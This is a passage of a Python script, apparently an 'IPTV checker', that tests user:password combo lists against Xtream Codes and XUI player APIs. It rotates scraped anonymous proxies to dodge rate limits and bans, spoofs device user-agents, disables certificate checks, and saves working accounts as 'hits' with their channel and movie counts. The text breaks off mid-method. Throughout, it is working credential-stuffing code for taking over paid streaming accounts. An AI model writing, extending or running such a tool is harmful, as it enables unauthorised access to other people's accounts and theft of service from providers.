"""
Author: ɪvory37  
Date: 2025-09-13  
Description:  
м3υ_√_ᴵⱽᴼᴿʸ³⁷ es una herramienta de verificación y extracción de datos para servidores IPTV, 
diseñada para analizar y validar credenciales en múltiples tipos de servidores (XUI, Xtream UI, Xtream Codes). 
License: Apache 2.0  
Changelog:  
  - Added automatic domain fetching from online sources and dynamic generation.
  - Removed domain testing logs from output, showing only in progress bar, and added valid domains display under "Dominios:".
"""

import sys
import json
import os
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import random
import datetime
import platform
import re
import queue
from queue import PriorityQueue
from urllib.parse import urlparse
from colorama import init, Fore, Style
from urllib3.exceptions import InsecureRequestWarning

try:
    import socks
    import requests.adapters
    from requests.packages.urllib3.poolmanager import PoolManager
except ImportError:
    import pip
    pip.main(['install', 'PySocks', 'requests[socks]'])
    import socks
    import requests.adapters
    from requests.packages.urllib3.poolmanager import PoolManager

requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:"
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:"
    "TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:"
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:"
    "ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
init()

# Global counters
COUNT_LIVE = None
CONTENT_LIVE = None
COUNT_SERIES = None
CONTENT_SERIES = None
COUNT_MOVIES = None
CONTENT_MOVIES = None

# Updated banner with icons and better aesthetics
banner = f"""
{Fore.LIGHTGREEN_EX}  .___                           _________________ {Fore.RESET}
{Fore.LIGHTGREEN_EX}  |   |__  _____________ ___.__. \\_____  \\______  \\ {Fore.RESET}
{Fore.LIGHTGREEN_EX}  |   \\  \\/ /  _ \\_  __ |   |  |  _(__  <   /    / {Fore.RESET}
{Fore.LIGHTGREEN_EX}  |   |\\   (  <_> )  | \\/\\___  | /       \\ /    / {Fore.RESET}
{Fore.LIGHTGREEN_EX}  |___| \\_/ \\____/|__|   / ____|/______  //____/ {Fore.RESET}
{Fore.LIGHTGREEN_EX}                         \\/              \\/ {Fore.RESET}
{Fore.LIGHTCYAN_EX}  {Fore.RED}彡★ {Fore.RESET}{Fore.MAGENTA}               м3υ_ᴵⱽᴼᴿʸ³⁷  {Fore.RESET} {Fore.RED}           ★彡 {Fore.RESET}
{Fore.LIGHTCYAN_EX}        📡  Verificación de Servidores IPTV  📡         {Fore.RESET}
{Fore.MAGENTA}           🔍  Análisis de Credenciales  🔍           {Fore.RESET}
"""

class Config:
    DEBUG_MODE = False
    COLORS = [
        Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.MAGENTA, Fore.CYAN,
        Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTYELLOW_EX,
        Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX
    ]
    URL_PATTERN = re.compile(
        r"^(https?://)?"
        r"[a-zA-Z0-9.-]+"
        r"(:\d{1,5})?"
        r"(/[^\s]*)?$"
    )
    HOST_PORT_PATTERN = r"^(?:https?://)?([\w.-]+):(\d+)(?:/.*)?$"
    system = platform.system()
    if system == "Windows":
        ROOT_DIR = "."
    elif system == "Linux":
        if os.path.exists("/sdcard"):
            ROOT_DIR = "/sdcard"
        else:
            ROOT_DIR = os.path.join(".", "sdcard")
    else:
        ROOT_DIR = "."
        
    HITS_DIR = os.path.join(ROOT_DIR, "м3υ_√_ᴵⱽᴼᴿʸ³⁷", "aciertos")
    HITS_COMBO_DIR = os.path.join(ROOT_DIR, "м3υ_√_ᴵⱽᴼᴿʸ³⁷", "combinaciones")
    COMBO_DIR = os.path.join(ROOT_DIR, "combinaciones")
    PROXIES_DIR = os.path.join(ROOT_DIR, "proxies")
    MIRROR_DIR = os.path.join(ROOT_DIR, "м3υ_√_ᴵⱽᴼᴿʸ³⁷", "espejos")
    DOMAINS_FILE = os.path.join(MIRROR_DIR, "dominios.txt")
    
    USERS_AGENTS = [
        "VLC/3.0.8 LibVLC/3.0.8",
        "Roku/9.4.0.4090-A5.00.42",
        "AppleTV11,1/11.1",
        "AndroidTV/8.0 (AFTT)",
        "Samsung Smart TV/5.0 (Tizen; x64)",
        "SunsetTVPlayer",
        "Dalvik/2.1.0 (Linux; U; Android 13; SM-G981B Build/SQ3A.220705.001)",
        "okhttp/4.9.0",
        "PlayStation 4/8.03 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2",
        "Nintendo Switch/10.1.0 (Linux; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
        "AppleCoreMedia/1.0.0.17C54 (Apple TV; U; CPU OS 13_3 like Mac OS X; de_de)",
        "AppleCoreMedia/1.0.0.17C54 (iPhone; U; CPU iPhone OS 13_5 like Mac OS X)",
        "Movian/5.0.488 (Linux; 4.4.0-59-generic; x86_64) CE-4300",
        "stagefright/1.2 (Linux;Android 5.0)",
        "Lavf58.20.100",
        "XBMC/18.9 (Linux; x86_64) Plex Media Server",
        "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
    ]
    BLOCKED_DOMAINS = []
    MAX_WORKERS_MIRRORS = 50
    MIRROR_TIMEOUT = 2
    MIRROR_RETRIES = 3
    PRIORITY_TLDS = [".xyz", ".club", ".tv", ".vip", ".cc"]

class ProxyManager:
    def __init__(self):
        self.proxy_list = []
        self.banned_proxies = set()
        self.current_proxy = None
        self.proxy_type = None
        self.live_proxies_count = 0
        self.dead_proxies_count = 0
        self.lock = threading.Lock()
        self.proxy_queue = PriorityQueue()
        self.recently_used_proxies = []
        self.max_recently_used = 10
        self.proxy_performance = {}

    def seleccionar_tipo_proxy(self):
        print(f"{Fore.CYAN}🔄 ┌──[SELECCIÓN DE TIPO DE PROXY]──")
        print(f"{Fore.CYAN}   │  {Fore.YELLOW}1. {Fore.WHITE}HTTP")
        print(f"{Fore.CYAN}   │  {Fore.YELLOW}2. {Fore.WHITE}SOCKS4")
        print(f"{Fore.CYAN}   │  {Fore.YELLOW}3. {Fore.WHITE}SOCKS5")
        print(f"{Fore.CYAN}   └──> ", end="")
        while True:
            try:
                choice = int(input(f"{Fore.WHITE}"))
                if choice == 1:
                    self.proxy_type = 'http'
                    return
                elif choice == 2:
                    self.proxy_type = 'socks4'
                    return
                elif choice == 3:
                    self.proxy_type = 'socks5'
                    return
                print(f"{Fore.RED}❌ Selección inválida. Elige 1-3{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}❌ Ingresa solo números{Style.RESET_ALL}")

    def get_headers(self, url):
        parsed = urlparse(url)
        is_https = parsed.scheme == 'https'
        host = f"{parsed.hostname}:443" if is_https else parsed.netloc
        headers = {
            "Host": host,
            "User-Agent": random.choice(Config.USERS_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
        if is_https:
            headers.update({
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-Ch-Ua": '"Chromium";v="118", "Google Chrome";v="118"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"'
            })
        return headers

    def obtener_proxies(self, archivo_proxy=None):
        urls = {
            'http': [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=elite",
                "https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            ],
            'socks4': [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
                "https://www.proxy-list.download/api/v1/get?type=socks4&anon=elite",
            ],
            'socks5': [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
                "https://www.proxy-list.download/api/v1/get?type=socks5&anon=elite",
            ]
        }
        
        if not self.proxy_type:
            self.seleccionar_tipo_proxy()
        
        todos_proxies = set()
        if archivo_proxy:
            try:
                with open(archivo_proxy, 'r', encoding='utf-8') as file:
                    proxies = [line.strip() for line in file if line.strip()]
                    todos_proxies.update(proxies)
                print(f"{Fore.GREEN}✅ Cargados {len(proxies)} proxies desde archivo{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}❌ Error leyendo archivo de proxies: {str(e)[:20]}{Style.RESET_ALL}")
                return False
        else:
            for index, url in enumerate(urls[self.proxy_type], start=1):
                try:
                    response = requests.get(url, timeout=(5,10), headers=self.get_headers(url))
                    if response.status_code != 200:
                        print(f"{Fore.RED}❌ Error obteniendo {url.split('/')[2]}: {response.status_code}{Style.RESET_ALL}")
                        continue
                    proxies = [line.strip() for line in response.text.splitlines() if line.strip()]
                    todos_proxies.update(proxies)
                    print(f"{Fore.GREEN}✅ Obtenidos {len(proxies)} proxies desde fuente [{index}]{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}❌ Error obteniendo {url.split('/')[2]}: {str(e)[:20]}{Style.RESET_ALL}")
        
        if not todos_proxies:
            print(f"{Fore.RED}❌ No se obtuvieron proxies{Style.RESET_ALL}")
            return False
            
        self.proxy_list = self.validar_proxies(list(todos_proxies))
        if not self.proxy_list:
            print(f"{Fore.RED}❌ No hay proxies activos disponibles{Style.RESET_ALL}")
            return False
            
        with self.lock:
            for proxy in self.proxy_list:
                self.proxy_queue.put((1, proxy))
            self.guardar_proxies()
            
        print(f"{Fore.GREEN}✅ {len(self.proxy_list)} activos, {self.dead_proxies_count} inactivos ({self.proxy_type.upper()}){Style.RESET_ALL}")
        return True

    def validar_proxies(self, proxies):
        test_url = "http://httpbin.org/get"
        proxies_activos = []
        total_proxies = len(proxies)
        self.live_proxies_count = 0
        self.dead_proxies_count = 0
        intervalo_actualizacion = 100

        try:
            real_ip = requests.get("http://httpbin.org/ip", timeout=(5,10)).json()['origin']
        except:
            print(f"{Fore.RED}❌ Falló al obtener IP real{Style.RESET_ALL}")
            return []

        def verificar_proxy(proxy):
            proxy_dict = {"http": f"{self.proxy_type}://{proxy}", "https": f"{self.proxy_type}://{proxy}"}
            start_time = time.time()
            try:
                response = requests.get(test_url, proxies=proxy_dict, timeout=5, headers=self.get_headers(test_url))
                if response.status_code == 200:
                    data = response.json()
                    proxy_ip = data.get("origin", "")
                    headers = data.get("headers", {})
                    nivel_anonimato = "Élite"

                    if real_ip == proxy_ip or real_ip in str(headers):
                        nivel_anonimato = "Transparente"
                    elif 'Via' in headers or 'Proxy-Connection' in headers:
                        nivel_anonimato = "Anónimo"

                    if nivel_anonimato != "Transparente":
                        with self.lock:
                            self.live_proxies_count += 1
                            proxies_activos.append(proxy)
                            response_time = time.time() - start_time
                            self.proxy_performance[proxy] = response_time
                    else:
                        with self.lock:
                            self.dead_proxies_count += 1
                else:
                    with self.lock:
                        self.dead_proxies_count += 1
            except:
                with self.lock:
                    self.dead_proxies_count += 1
            finally:
                with self.lock:
                    procesados = self.live_proxies_count + self.dead_proxies_count
                    if procesados % intervalo_actualizacion == 0 or procesados == total_proxies:
                        print('\r' + ' ' * 100 + '\r', end='', flush=True)
                        print(f"{Fore.CYAN}📊 Progreso: {procesados}/{total_proxies} | Activos: {Fore.GREEN}{self.live_proxies_count}{Fore.CYAN} | Inactivos: {Fore.RED}{self.dead_proxies_count}{Style.RESET_ALL}", end="\r", flush=True)

        max_hilos = min(200, len(proxies))
        with ThreadPoolExecutor(max_workers=max_hilos) as executor:
            executor.map(verificar_proxy, proxies)

        print()
        return proxies_activos

    def verificar_proxies_contra_objetivo(self, url_objetivo, timeout=5, verbose=False):
        proxies_activos = []
        total_proxies = len(self.proxy_list)
        self.live_proxies_count = 0
        self.dead_proxies_count = 0
        intervalo_actualizacion = 100

        def verificar_proxy_contra_objetivo(proxy):
            proxy_dict = {"http": f"{self.proxy_type}://{proxy}", "https": f"{self.proxy_type}://{proxy}"}
            start_time = time.time()
            try:
                response = requests.get(url_objetivo, proxies=proxy_dict, timeout=timeout, headers=self.get_headers(url_objetivo), verify=False)
                if response.status_code in (200, 401, 403):
                    with self.lock:
                        self.live_proxies_count += 1
                        proxies_activos.append(proxy)
                        response_time = time.time() - start_time
                        self.proxy_performance[proxy] = response_time
                        if verbose:
                            print(f"{Fore.GREEN}✅ Proxy {proxy} funciona para {url_objetivo} (Tiempo: {response_time:.2f}s){Style.RESET_ALL}")
                else:
                    with self.lock:
                        self.dead_proxies_count += 1
                        if verbose:
                            print(f"{Fore.RED}❌ Proxy {proxy} falló para {url_objetivo}: Código {response.status_code}{Style.RESET_ALL}")
            except Exception as e:
                with self.lock:
                    self.dead_proxies_count += 1
                    if verbose:
                        print(f"{Fore.RED}❌ Proxy {proxy} falló para {url_objetivo}: {str(e)[:50]}{Style.RESET_ALL}")
            finally:
                with self.lock:
                    procesados = self.live_proxies_count + self.dead_proxies_count
                    if procesados % intervalo_actualizacion == 0 or procesados == total_proxies:
                        print('\r' + ' ' * 100 + '\r', end='', flush=True)
                        print(f"{Fore.CYAN}📊 Progreso: {procesados}/{total_proxies} | Activos: {Fore.GREEN}{self.live_proxies_count}{Fore.CYAN} | Inactivos: {Fore.RED}{self.dead_proxies_count}{Style.RESET_ALL}", end="\r", flush=True)

        print(f"{Fore.CYAN}🔍 Verificando {total_proxies} proxies contra {url_objetivo}...{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=min(200, total_proxies)) as executor:
            executor.map(verificar_proxy_contra_objetivo, self.proxy_list)

        print()
        self.proxy_list = proxies_activos
        with self.lock:
            self.proxy_queue = PriorityQueue()
            for proxy in self.proxy_list:
                prioridad = self.proxy_performance.get(proxy, 1)
                self.proxy_queue.put((prioridad, proxy))
            self.guardar_proxies()
        print(f"{Fore.GREEN}✅ {len(self.proxy_list)} proxies optimizados para {url_objetivo}{Style.RESET_ALL}")

    def guardar_proxies(self):
        try:
            os.makedirs(Config.PROXIES_DIR, exist_ok=True)
            archivo_proxy = os.path.join(Config.PROXIES_DIR, f"proxies_activos_{self.proxy_type}.txt")
            with open(archivo_proxy, 'w', encoding='utf-8') as f:
                for proxy in self.proxy_list:
                    f.write(f"{proxy}\n")
            print(f"{Fore.GREEN}✅ Guardados {len(self.proxy_list)} proxies activos en {archivo_proxy}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ Error guardando proxies: {str(e)[:20]}{Style.RESET_ALL}")

    def obtener_proxy(self):
        with self.lock:
            if not self.proxy_list:
                self.current_proxy = None
                return None

            if self.proxy_queue.empty():
                proxies_disponibles = [
                    p for p in self.proxy_list
                    if p not in self.banned_proxies and p not in self.recently_used_proxies
                ]
                if not proxies_disponibles:
                    proxies_disponibles = [p for p in self.proxy_list if p not in self.banned_proxies]
                    self.recently_used_proxies.clear()
                if not proxies_disponibles:
                    self.current_proxy = None
                    return None
                for proxy in proxies_disponibles:
                    prioridad = self.proxy_performance.get(proxy, 1)
                    self.proxy_queue.put((prioridad, proxy))

            prioridad, proxy = self.proxy_queue.get()
            self.recently_used_proxies.append(proxy)
            if len(self.recently_used_proxies) > self.max_recently_used:
                self.recently_used_proxies.pop(0)

            self.current_proxy = proxy
            return {"http": f"{self.proxy_type}://{proxy}", "https": f"{self.proxy_type}://{proxy}"}

    def banear_proxy(self, proxy):
        with self.lock:
            if proxy and proxy not in self.banned_proxies:
                self.banned_proxies.add(proxy)
                temp_queue = PriorityQueue()
                while not self.proxy_queue.empty():
                    prioridad, p = self.proxy_queue.get()
                    if p != proxy:
                        temp_queue.put((prioridad, p))
                self.proxy_queue = temp_queue
                self.guardar_proxies()

    @property
    def contador_activos(self):
        return len(self.proxy_list) - len(self.banned_proxies)

    @property
    def contador_baneados(self):
        return len(self.banned_proxies)

class InformacionServidor:
    def __init__(self, api_url):
        self.api_url = api_url.rstrip('/')
        self.info = {}
        self.obtener_info()

    def obtener_info(self):
        try:
            host = self.api_url.split('/')[2].split(':')[0] if ':' in self.api_url else self.api_url.split('/')[2]
            url = f"http://ip-api.com/json/{host}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                self.info = response.json()
        except Exception as e:
            print(f"{Fore.RED}❌ Error obteniendo información del servidor: {str(e)[:20]}{Style.RESET_ALL}")

class EstadoEscaneo:
    def __init__(self):
        self.say = 0
        self.aciertos = 0
        self.bul = 0
        self.cpm = 1
        self.codigo_estado = 0
        self.lista_aciertos = []
        self.lista_espejos = []
        self.primer_acierto_procesado = False
        self.tiempo_inicio = time.time()
        self.ultima_actualizacion = 0
        self.usuario_actual = ""
        self.contrasena_actual = ""
        self.bot_actual = ""
        self.current_fyz = 0
        self.current_oran = 0
        self.dominios_probados = 0
        self.total_dominios = 0
        self._lock = threading.Lock()
        self.puerto_servidor_principal = "8080"
        self.usuario_espejo = ""
        self.contrasena_espejo = ""
        self.dominios_probados_set = set()
        self.dominios_probados_por_segundo = 0
        self.ultimos_dominios_probados = 0
        self.ultima_verificacion_tiempo = time.time()
        self.dominios_recientes = []
        self.dominios_escaneados = set()

estado = EstadoEscaneo()

class ManejadorArchivos:
    @staticmethod
    def leer_usuarios(ruta_archivo):
        try:
            with open(ruta_archivo, 'r', encoding='utf-8') as archivo:
                return [linea.strip() for linea in archivo if ':' in linea]
        except Exception as e:
            print(f"{Fore.RED}❌ Error leyendo archivo: {str(e)[:20]}{Style.RESET_ALL}")
            return []

    @staticmethod
    def listar_archivos():
        try:
            os.makedirs(Config.COMBO_DIR, exist_ok=True)
            archivos = [f for f in os.listdir(Config.COMBO_DIR) if os.path.isfile(os.path.join(Config.COMBO_DIR, f))]
            if not archivos:
                print(f"{Fore.RED}❌ No se encontraron archivos combo en {Config.COMBO_DIR}{Style.RESET_ALL}")
                return None
            print(f"{Fore.CYAN}📂 ┌──[ARCHIVOS COMBO DISPONIBLES]──")
            for i, archivo in enumerate(archivos, 1):
                print(f"{Fore.CYAN}   │  {Fore.YELLOW}{i}. {Fore.WHITE}{archivo}")
            print(f"{Fore.CYAN}   └──> ", end="")
            while True:
                try:
                    eleccion = int(input(f"{Fore.WHITE}"))
                    if 1 <= eleccion <= len(archivos):
                        return os.path.join(Config.COMBO_DIR, archivos[eleccion - 1])
                    print(f"{Fore.RED}❌ Elige un número entre 1 y {len(archivos)}{Style.RESET_ALL}")
                except ValueError:
                    print(f"{Fore.RED}❌ Ingresa un número válido{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ Error accediendo a {Config.COMBO_DIR}: {str(e)[:20]}{Style.RESET_ALL}")
            return None

class ValidadorIPTV:
    def __init__(self, api_url, num_hilos=10):
        self.api_url = api_url
        self.informacion_servidor = InformacionServidor(api_url)
        self.num_hilos = num_hilos
        self.max_reintentos = 5
        self.usuarios_validos = 0
        self.usuarios_invalidos = 0
        self.total_usuarios = 0
        self.total_procesados = 0
        self.contador_reintentos = 0
        self.usar_proxies = False
        self.administrador_proxies = ProxyManager()
        self.lock = threading.Lock()
        self.tiempo_inicio = time.time()
        self.valor_cpm = 0
        self.calculo_cpm = time.time()
        self.hilo_actual = None
        self.ultimo_error = "N/A"
        self.nick = "IVORY37"
        self.encabezados_ataque = {}
        self.incluir_categorias = False
        self.archivo_salida = ""
        self.archivo_combo = ""
        self.ejecutor_guardado = ThreadPoolExecutor(max_workers=1)

    def obtener_encabezados_aleatorios(self):
        encabezados = {
            "User-Agent": random.choice(Config.USERS_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        }
        encabezados.update(self.encabezados_ataque)
        return encabezados

    def obtener_configuracion_ataque(self, eleccion):
        ataques = {
            '1': {"headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}},
            '2': {"headers": {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G960F Build/PPR1.180610.011)"}},
        }
        return ataques.get(eleccion, {"headers": {}})

    def obtener_categorias(self, usuario, contrasena, proxy_seleccionado):
        categorias = ""
        try:
            url = f"{self.api_url}/player_api.php?username={usuario}&password={contrasena}&action=get_live_categories"
            response = requests.get(url, timeout=(3,5), headers=self.obtener_encabezados_aleatorios(), proxies=proxy_seleccionado, verify=False)
            if response.status_code == 200:
                datos = response.json()
                categorias = "\n".join([cat.get('category_name', 'N/A') for cat in datos])
        except Exception as e:
            print(f"{Fore.RED}❌ Error obteniendo categorías: {str(e)[:20]}{Style.RESET_ALL}")
        return categorias

    def validar_usuario(self, linea_usuario):
        reintentos = 0
        id_hilo = threading.current_thread().name.split('-')[-1]
        resultado = None
        
        while reintentos < self.max_reintentos:
            proxy_seleccionado = self.administrador_proxies.obtener_proxy()
            if proxy_seleccionado is None:
                print(f"{Fore.RED}❌ No hay proxies disponibles{Style.RESET_ALL}")
                return
            
            try:
                usuario, contrasena = linea_usuario.strip().split(':')
                url = f"{self.api_url}/player_api.php?username={usuario}&password={contrasena}"
                encabezados = self.obtener_encabezados_aleatorios()
                response = requests.get(url, timeout=(5,10), headers=encabezados, proxies=proxy_seleccionado, verify=False)
                codigo_estado = response.status_code
                
                with self.lock:
                    self.hilo_actual = id_hilo
                    self.ultimo_error = "N/A"
                    if codigo_estado == 200:
                        if not response.text or not response.text.strip().startswith('{'):
                            self.usuarios_invalidos += 1
                            self.ultimo_error = "Respuesta JSON inválida"
                            self.total_procesados += 1
                            self.generar_estadisticas(f"Código {codigo_estado}:Falló", linea_usuario)
                            return
                        try:
                            datos = response.json()
                            info_usuario = datos.get("user_info", {})
                            if info_usuario.get("auth") == 1 and info_usuario.get("status") == "Active":
                                self.usuarios_validos += 1
                                self.ejecutor_guardado.submit(self.guardar_usuario_valido, linea_usuario, datos, proxy_seleccionado)
                            else:
                                self.usuarios_invalidos += 1
                            resultado = "éxito"
                            self.generar_estadisticas(codigo_estado, linea_usuario)
                            break
                        except json.decoder.JSONDecodeError:
                            self.administrador_proxies.banear_proxy(self.administrador_proxies.current_proxy)
                            reintentos += 1
                            self.contador_reintentos += 1
                            self.ultimo_error = "Error JSON: Sin respuesta JSON"
                            self.generar_estadisticas(f"Reintento {reintentos}", linea_usuario)
                            continue
                    elif codigo_estado in (403, 404):
                        self.usuarios_invalidos += 1
                        resultado = "éxito"
                        self.generar_estadisticas(codigo_estado, linea_usuario)
                        break
                    elif codigo_estado == 429:
                        self.administrador_proxies.banear_proxy(self.administrador_proxies.current_proxy)
                        reintentos += 1
                        self.contador_reintentos += 1
                        self.ultimo_error = "Baneado (429)"
                        self.generar_estadisticas(f"Reintento {reintentos}", linea_usuario)
                        continue
                    else:
                        reintentos += 1
                        self.contador_reintentos += 1
                        self.ultimo_error = f"Código {codigo_estado}"
                        self.generar_estadisticas(f"Reintento {reintentos}", linea_usuario)
                        continue
                
            except requests.Timeout:
                with self.lock:
                    reintentos += 1
                    self.contador_reintentos += 1
                    self.ultimo_error = "Timeout"
                    self.generar_estadisticas(f"Error {reintentos}", linea_usuario)
                    continue
            except requests.RequestException as e:
                with self.lock:
                    reintentos += 1
                    self.contador_reintentos += 1
                    self.ultimo_error = "Error Conexión"
                    self.generar_estadisticas(f"Error {reintentos}", linea_usuario)
                    continue

        with self.lock:
            self.total_procesados += 1
            if reintentos >= self.max_reintentos and resultado is None:
                self.usuarios_invalidos += 1
                self.generar_estadisticas("Falló", linea_usuario)

    def validar_usuario_sin_proxy(self, linea_usuario):
        reintentos = 0
        id_hilo = threading.current_thread().name.split('-')[-1]
        resultado = None
        
        while reintentos < self.max_reintentos:
            try:
                usuario, contrasena = linea_usuario.strip().split(':')
                url = f"{self.api_url}/player_api.php?username={usuario}&password={contrasena}"
                encabezados = self.obtener_encabezados_aleatorios()
                response = requests.get(url, timeout=(5,10), headers=encabezados, verify=False)
                codigo_estado = response.status_code
                
                with self.lock:
                    self.hilo_actual = id_hilo
                    self.ultimo_error = "N/A"
                    if codigo_estado == 200:
                        if not response.text or not response.text.strip().startswith('{'):
                            self.usuarios_invalidos += 1
                            self.ultimo_error = "Respuesta JSON inválida"
                            self.total_procesados += 1
                            self.generar_estadisticas(f"Código {codigo_estado}:Falló", linea_usuario)
                            return
                        try:
                            datos = response.json()
                            info_usuario = datos.get("user_info", {})
                            if info_usuario.get("auth") == 1 and info_usuario.get("status") == "Active":
                                self.usuarios_validos += 1
                                self.ejecutor_guardado.submit(self.guardar_usuario_valido, linea_usuario, datos, None)
                            else:
                                self.usuarios_invalidos += 1
                            resultado = "éxito"
                            self.generar_estadisticas(codigo_estado, linea_usuario)
                            break
                        except json.decoder.JSONDecodeError:
                            reintentos += 1
                            self.contador_reintentos += 1
                            self.ultimo_error = "Error JSON: Sin respuesta JSON"
                            self.generar_estadisticas(f"Reintento {reintentos}", linea_usuario)
                            continue
                    elif codigo_estado in (403, 404):
                        self.usuarios_invalidos += 1
                        resultado = "éxito"
                        self.generar_estadisticas(codigo_estado, linea_usuario)
                        break
                    else:
                        reintentos += 1
                        self.contador_reintentos += 1
                        self.ultimo_error = f"Código {codigo_estado}"
                        self.generar_estadisticas(f"Reintento {reintentos}", linea_usuario)
                        continue
                
            except requests.Timeout:
                with self.lock:
                    reintentos += 1
                    self.contador_reintentos += 1
                    self.ultimo_error = "Timeout"
                    self.generar_estadisticas(f"Error {reintentos}", linea_usuario)
                    continue
            except requests.RequestException as e:
                with self.lock:
                    reintentos += 1
                    self.contador_reintentos += 1
                    self.ultimo_error = f"Error Conexión: {str(e)[:50]}"
                    self.generar_estadisticas(f"Error {reintentos}", linea_usuario)
                    continue

        with self.lock:
            self.total_procesados += 1
            if reintentos >= self.max_reintentos and resultado is None:
                self.usuarios_invalidos += 1
                self.generar_estadisticas("Falló", linea_usuario)

    def obtener_contador_transmisiones_vivo(self, usuario, contrasena, reintentos=2, proxy_seleccionado=None):
        global COUNT_LIVE, CONTENT_LIVE
        for intento in range(reintentos):
            try:
                url_vivo = f"{self.api_url}/player_api.php?username={usuario}&password={contrasena}&action=get_live_streams"
                respuesta_vivo = requests.get(url_vivo, timeout=(3, 5), headers=self.obtener_encabezados_aleatorios(), proxies=proxy_seleccionado, verify=False)
                if respuesta_vivo.status_code == 200:
                    CONTENT_LIVE = respuesta_vivo.json()
                    if COUNT_LIVE is None:
                        COUNT_LIVE = 0
                    contador = len(CONTENT_LIVE)
                    COUNT_LIVE += contador
                    return contador
                else:
                    print(f"{Fore.RED}❌ Error obteniendo transmisiones en vivo (intento {intento + 1}/{reintentos}): Código {respuesta_vivo.status_code}{Style.RESET_ALL}")
            except requests.RequestException as e:
                print(f"{Fore.RED}❌ Error obteniendo transmisiones en vivo (intento {intento + 1}/{reintentos}): {str(e)[:50]}{Style.RESET_ALL}")
            if intento < reintentos - 1:
                time.sleep(0.5)
        return 0

    def obtener_contador_vod(self, usuario, contrasena, reintentos=2, proxy_seleccionado=None):
        global COUNT_MOVIES, CONTENT_MOVIES
        for intento in range(reintentos):
            try:
                url_vod = f"{self.api_url}/player_api.php?username={usuario}&password={contrasena}&action=get_vod_streams"
                respuesta_vod = requests.get(url_vod, timeout=(3, 5), headers=self.obtener_encabezados_aleatorios(), proxies=proxy_seleccionado, verify=False)
                if respuesta_vod.status_code == 200:
                    CONTENT_MOVIES = respuesta_vod.json()
                    contador = len(CONTENT_MOVIES)
                    if COUNT_MOVIES is None:
                        COUNT_MOVIES = 0
                    COUNT_MOVIES += contador
                    return contador
                else:
                    print(f"{Fore.RED}❌ Error obteniendo películas (intento {intento + 1}/{reintentos}): Código {respuesta_vod.status_code}{Style.RESET_ALL}")
            except requests.RequestException as e:
                print(f"{Fore.RED}❌ Error obteniendo películas (intento {intento + 1}/{reintentos}): {str(e)[:50]}{Style.RESET_ALL}")
            if intento < reintentos - 1:
                time.sleep(0.5)
        return 0

    def obtener_contador_series(self, usuario, contrasena, reintentos=2, proxy_seleccionado=None):
        global COUNT_SERIES, CONTENT_SERIES
        for intento in range(reintentos):
            try:
